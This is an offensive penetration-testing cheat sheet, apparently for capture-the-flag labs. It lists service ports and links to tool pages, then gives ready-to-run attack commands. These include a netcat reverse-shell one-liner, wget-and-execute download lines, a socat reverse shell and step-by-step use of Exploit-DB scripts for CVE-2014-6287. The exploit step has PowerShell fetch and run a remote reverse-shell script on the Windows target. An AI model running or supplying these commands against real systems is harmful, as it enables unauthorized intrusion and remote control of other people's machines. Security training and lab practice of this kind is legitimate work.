# CheatSheet

## Ports
| Service | Port      |
|:-------:|:---------:|
| FTP     | 20 / 21   |
| SSH     | 22        |
| Telnet  | 23        |
| SMTP    | 25        |
| DNS     | 53        |
| HTTP    | 80        |
| POP3    | 110       |
| HTTPS   | 443       |
| SMB     | 139 / 445 |
| NFS     | 2049      |
| MySQL   | 3306      |

## Tools
- [Rustscan](rustscan.md)
- [Nmap](nmap.md)
- [MSFVenom](msfvenom.md)
- [Gobuster](gobuster.md)
- [Hydra](hydra.md)
- [John the Ripper](john.md)
- [Hashcat](hashcat.md)

## Exploit by protocol
- [SSH](ssh.md)
- [SMB](smb.md)
- [Telnet](telnet.md)
- [NFS](nfs.md)
- [FTP](ftp.md)
- [SMTP](smtp.md)
- [MySQL](mysql.md)

## Useful Commands
Generate shell payload
```
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 4444 >/tmp/f" > shell.sh
```

Download file from local Web server on kali
```
FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE; sh /tmp/$FILE
```

### Socat
・Target Host  
```
wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4445
```

・Attacker (Kali)
```
socat file:`tty`,raw,echo=0 TCP-L:4445
```

Additional Settings :
```
export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
```

## Exploit DB (Windows)
### CVE : 2014-6287 ([39161](https://www.exploit-db.com/exploits/39161))
You can execute arbitrary commands on the remote Windows host.

Download the python script to kali
```
wget https://www.exploit-db.com/raw/39161 -O /tmp/39161.py
```

Download netcat binary file.  
39161.pyではあらかじめローカルIP、ポートを指定する必要あり。指定したアドレスから、netcatの実行可能ファイルをnc.exeという名前でダウンロードする仕様。そして、ダウンロードしたnc.exeを実行し、そのローカルIP、ポートにコネクトバックする（リバースシェル）
```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe -O ~/Downloads/steel/nc.exe
```

Start python web server in kali
```
cd ~/Downloads/steel/
python3 -m http.server 80
```

Start netcat listener
```
rlwrap nc -lvnp ${lport}
```

The following command needs to be executed TWICE.
Download nc.exe first, and connects back to the listner on Kali second time. 
```
python 39161.py $rhost [RPORT]
```

### CVE : 2014-6287 ([49125](https://www.exploit-db.com/exploits/49125))
You can execute arbitrary commands on the remote Windows host.

Download the python script to kali
```
wget https://www.exploit-db.com/raw/49125 -O /tmp/49125.py
```

Download the powershell script to kali.
Local IP and port in the script needs to be changed.
```
wget https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1 -O ~/Downloads/steel/mini-reverse.ps1
```

Start python web server in kali
```
cd ~/Downloads/steel/
python3 -m http.server 80
```

Start netcat listener
```
rlwrap nc -lvnp ${lport}
```

Execute the script. Execute the commands passed as the third argument.
```
cd /tmp
python3 49125.py $rhost [RPORT] "C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -c wget 'http://${lhost}/mini-reverse.ps1' -outfile 'C:\Users\Bill\Desktop\mini-reverse.ps1'; C:\Users\Bill\Desktop\mini-reverse.ps1" 
```

## Reference

Exploit DB  
https://www.exploit-db.com/

MSF Console Commands  
https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

Meterpreter Commands  
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

GTFOBins  
https://gtfobins.github.io/

PayloadsAllTheThings / Reverse Shell Cheat Sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

PayloadsAllTheThings / Linux - Privilege Escalation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-suid-binaries

CrackStation  
https://crackstation.net/

Hash Analyzer  
https://www.tunnelsup.com/hash-analyzer/

Upgrading Simple Shells to Fully Interactive TTYs  
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
